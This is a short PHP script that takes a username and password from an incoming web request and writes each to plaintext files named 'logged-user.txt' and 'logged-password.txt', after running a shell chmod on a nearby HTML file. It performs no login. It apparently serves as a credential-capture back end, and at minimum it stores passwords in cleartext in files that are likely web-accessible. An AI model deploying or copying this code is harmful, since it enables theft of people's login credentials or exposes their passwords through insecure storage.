<?php
$command = escapeshellcmd('chmod -R 0444 ../_work.htm');
$output = shell_exec($command);

$user = $_REQUEST['current_user'];
$pass = $_REQUEST['current_pass'];

$userFile = 'logged-user.txt';

$handleUser = fopen($userFile, 'w') or die('cannot open file');

fwrite($handleUser, $user);

fclose($handleUser);

$passwordFile = 'logged-password.txt';

$handlePassFile = fopen($passwordFile, 'w') or die('cannot open password file');

fwrite($handlePassFile, $pass);

fclose($handlePassFile);